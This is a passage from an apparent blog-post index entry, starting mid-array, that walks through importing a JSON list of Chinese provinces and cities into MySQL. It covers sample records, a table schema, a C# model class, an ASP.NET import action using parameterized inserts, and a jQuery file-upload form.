\u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 5, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;广东\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 6, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;广西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 7, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;贵州\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 8, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;海南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:37\u0026#34; }, { \u0026#34;id\u0026#34;: 9, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;河北\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:06\u0026#34; }, { \u0026#34;id\u0026#34;: 10, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;河南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:07\u0026#34; }, { \u0026#34;id\u0026#34;: 11, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;黑龙江\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 12, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;湖北\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 13, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;湖南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 14, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;吉林\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:07\u0026#34; }, { \u0026#34;id\u0026#34;: 15, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;江苏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 16, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;江西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 17, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;辽宁\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 18, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;内蒙古\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 19, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宁夏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 20, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;青海\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 21, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;山东\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 22, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;山西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 23, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;陕西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 24, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101020100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;上海\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;200000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;021\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 25, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;四川\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 26, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101030100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;天津\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;300000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;022\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 27, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;西藏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 28, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;新疆\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 29, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;云南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 30, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;浙江\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 31, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101040100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;重庆\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: \u0026#34;023\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 32, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101320101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;香港\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;999077\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;+852\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:38\u0026#34; }, { \u0026#34;id\u0026#34;: 33, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101330101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;澳门\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;999078\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;+853\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:39\u0026#34; }, { \u0026#34;id\u0026#34;: 34, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;台湾\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 35, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220601\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;安庆\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;246000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0556\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 36, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220201\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;蚌埠\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;233000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0552\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 37, \u0026#34;pid\u0026#34;: 3400, \u0026#34;city_code\u0026#34;: \u0026#34;101220105\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;巢湖市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;238000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0551\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:40\u0026#34; }, { \u0026#34;id\u0026#34;: 38, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221701\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;池州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;247100\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0566\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 39, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;滁州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;239000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0550\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 40, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220801\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;阜阳\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;236000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0558\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 41, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221201\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;淮北\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;235000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0561\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 42, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220401\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;淮南\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;232000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0554\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 43, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221001\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;黄山市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;245000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0559\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 21:23:56\u0026#34; }, { \u0026#34;id\u0026#34;: 44, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221501\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;六安\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;237000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0564\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 45, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220501\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;马鞍山\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;243000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0555\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 46, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220701\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宿州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;234000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0557\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 47, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221301\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;铜陵\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;244000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0562\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; }, { \u0026#34;id\u0026#34;: 48, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220301\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;芜湖市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;241000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0553\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 21:23:57\u0026#34; }, { \u0026#34;id\u0026#34;: 49, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221401\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宣城\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;242000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0563\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; }, { \u0026#34;id\u0026#34;: 50, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220901\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;亳州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;236800\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0558\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; } //... ] SQL\nCREATE TABLE CityInfo ( CtId INT NOT NULL AUTO_INCREMENT, Pid INT DEFAULT \u0026#39;0\u0026#39;, CityCode VARCHAR(20) DEFAULT \u0026#39;\u0026#39;, CityName VARCHAR(110) DEFAULT \u0026#39;\u0026#39;, PostCode VARCHAR(20) DEFAULT \u0026#39;\u0026#39;, AreaCode VARCHAR(20) DEFAULT \u0026#39;\u0026#39;, Ctime DATETIME DEFAULT NULL, CtimeInt bigint DEFAULT \u0026#39;0\u0026#39;, LangType INT DEFAULT \u0026#39;0\u0026#39;, PRIMARY KEY (CtId) ); .NET类\npublic class CityInfo { public int CtId { get; set; } public int Pid { get; set; } public string CityCode { get; set; } public string CityName { get; set; } public string PostCode { get; set; } public string AreaCode { get; set; } public DateTime? Ctime { get; set; } public long CtimeInt { get; set; } public int LangType { get; set; } } 后端处理 json file \u0026raquo;\u0026gt; class \u0026raquo;\u0026gt; sql\n[HttpPost] public ActionResult ImportCities(IFormFile file) { try { if (file == null || file.Length == 0) { return Json(new { success = false, message = \u0026#34;No file uploaded.\u0026#34; }); } using (var streamReader = new StreamReader(file.InputStream)) { var jsonData = streamReader.ReadToEnd(); var cityList = JsonConvert.DeserializeObject\u0026lt;List\u0026lt;CityInfo\u0026gt;\u0026gt;(jsonData); using (MySqlConnection connection = new MySqlConnection(ConnectionString)) { connection.Open(); foreach (var city in cityList) { string query = \u0026#34;INSERT INTO IMCityInfo (Pid, CityCode, CityName, PostCode, AreaCode, Ctime, CtimeInt, LangType) VALUES (@Pid, @CityCode, @CityName, @PostCode, @AreaCode, @Ctime, @CtimeInt, @LangType)\u0026#34;; using (MySqlCommand command = new MySqlCommand(query, connection)) { command.Parameters.AddWithValue(\u0026#34;@Pid\u0026#34;, city.Pid); command.Parameters.AddWithValue(\u0026#34;@CityCode\u0026#34;, city.CityCode); command.Parameters.AddWithValue(\u0026#34;@CityName\u0026#34;, city.CityName); command.Parameters.AddWithValue(\u0026#34;@PostCode\u0026#34;, city.PostCode); command.Parameters.AddWithValue(\u0026#34;@AreaCode\u0026#34;, city.AreaCode); command.Parameters.AddWithValue(\u0026#34;@Ctime\u0026#34;, city.Ctime); command.Parameters.AddWithValue(\u0026#34;@CtimeInt\u0026#34;, city.CtimeInt); command.Parameters.AddWithValue(\u0026#34;@LangType\u0026#34;, city.LangType); command.ExecuteNonQuery(); } } } } return Json(new { success = true, message = \u0026#34;Data imported successfully.\u0026#34; }); } catch (Exception ex) { return Json(new { success = false, message = ex.Message }); } } 前端上传JSON\n\u0026lt;form id=\u0026#34;uploadForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;jsonFile\u0026#34; accept=\u0026#34;.json\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Upload JSON File\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;response\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.6.0.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; $(document).ready(function () { $(\u0026#39;#uploadForm\u0026#39;).on(\u0026#39;submit\u0026#39;, function (event) { event.preventDefault(); // Prevent the default form submission var formData = new FormData(); var fileInput = $(\u0026#39;#jsonFile\u0026#39;)[0]; if (fileInput.files.length \u0026gt; 0) { var file = fileInput.files[0]; formData.append(\u0026#39;file\u0026#39;, file); $.ajax({ url: \u0026#39;/ImportCities\u0026#39;, // Adjust this URL to match your API endpoint type: \u0026#39;POST\u0026#39;, data: formData, processData: false, // Important! contentType: false, // Important! success: function (response) { $(\u0026#39;#response\u0026#39;).text(\u0026#39;Success: \u0026#39; + response.message); }, error: function (error) { $(\u0026#39;#response\u0026#39;).text(\u0026#39;Error: \u0026#39; + error.responseJSON.error); } }); } else { $(\u0026#39;#response\u0026#39;).text(\u0026#39;Please select a file.\u0026#39;); } }); }); ","permalink":"https://qfsyso.github.io/posts/.net-json2mysql/","summary":"这是一段json\n[ { \u0026#34;id\u0026#34;: 1, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101010100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;北京\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;100000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;010\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:06\u0026#34; }, { \u0026#34;id\u0026#34;: 2, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;安徽\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 3, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;福建\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 4, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;甘肃\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 5, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;广东\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 6, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;广西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 7, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;贵州\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 8, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;海南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:37\u0026#34; }, { \u0026#34;id\u0026#34;: 9, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;河北\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:06\u0026#34; }, { \u0026#34;id\u0026#34;: 10, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;河南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:07\u0026#34; }, { \u0026#34;id\u0026#34;: 11, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;黑龙江\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 12, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;湖北\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 13, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;湖南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 14, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;吉林\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:07\u0026#34; }, { \u0026#34;id\u0026#34;: 15, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;江苏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 16, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;江西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 17, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;辽宁\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 18, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;内蒙古\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 19, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宁夏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 20, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;青海\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 21, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;山东\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 22, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: 